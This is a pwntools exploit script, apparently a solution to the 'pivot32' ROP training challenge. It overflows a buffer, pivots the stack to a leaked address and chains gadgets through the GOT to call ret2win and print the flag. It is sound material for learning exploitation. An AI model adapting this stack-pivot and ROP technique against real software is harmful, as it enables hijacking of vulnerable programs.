#!/usr/bin/python3

from pwn import *

# context.log_level = 'DEBUG'

# Interesting gadgets

mov_eax_from_eax_addr = 0x080488c4
pop_eax_addr = 0x080488c0
pop_ebx_addr = 0x08048571
add_eax_ebx_addr = 0x080488c7
call_eax_addr = 0x080486a3
xchg_eax_esp_addr = 0x080488c2

elf = ELF('./pivot32')
lib = ELF('./libpivot32.so')

# Build second ROP-chain

foothold_plt = elf.plt.foothold_function
foothold_got = elf.got.foothold_function

delta = lib.symbols.ret2win - lib.symbols.foothold_function

# Execute foothold_function so the linker resolve its address and store it on GOT

rop = ''
rop += p32(foothold_plt)

# Get foothold_function resolved address

rop += p32(pop_eax_addr)
rop += p32(foothold_got)
rop += p32(mov_eax_from_eax_addr)

# Calculate ret2win address

rop += p32(pop_ebx_addr)
rop += p32(delta)
rop += p32(add_eax_ebx_addr)

# Execute ret2win

rop += p32(call_eax_addr)


# Start process

p = process(elf.path)

p.recvuntil('pivot: ')
pivot_addr = int(p.recvline().strip(), 0)

log.info('pivot_addr = 0x%x' % pivot_addr)

# Build first ROP-chain (pivot)

r0p = 'A' * 44

# Set eax to pivot_addr

r0p += p32(pop_eax_addr)
r0p += p32(pivot_addr)

# Switch eax and esp values

r0p += p32(xchg_eax_esp_addr)

# Continue exploitation

p.recvuntil('> ')
p.sendline(rop)

p.recvuntil('> ')
p.sendline(r0p)

p.recv(1024)

log.info("Flag: {p.recv(1024).decode()}")
